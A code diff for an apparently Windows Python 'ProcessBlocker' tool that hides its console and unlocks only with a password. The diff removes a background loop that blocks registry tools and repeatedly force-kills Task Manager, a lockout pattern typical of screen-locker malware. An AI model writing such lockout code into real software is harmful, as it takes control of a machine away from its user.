@@ -4,7 +4,6 @@ import time
 import ctypes
 import psutil
 import winreg
-import getpass
 import shutil
 import threading
 import tkinter as tk
@@ -145,7 +144,6 @@ class ProcessBlocker:
         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
         threading.Thread(target=self._process_monitor, daemon=True).start()
-        threading.Thread(target=self._system_protection, daemon=True).start()
 
         self.root.mainloop()
 
@@ -167,16 +165,7 @@ class ProcessBlocker:
 
             time.sleep(0.4)
 
-    def _system_protection(self):
-        while self.running:
-            try:
-                self._block_registry_tools(True)
-                os.system('taskkill /f /im taskmgr.exe >nul 2>&1')
 
-            except Exception as e:
-                self._log_error(f"System protection: {str(e)}")
-
-            time.sleep(1)
 
     def _unlock_system(self):
         if self.pass_entry.get() == self.password:
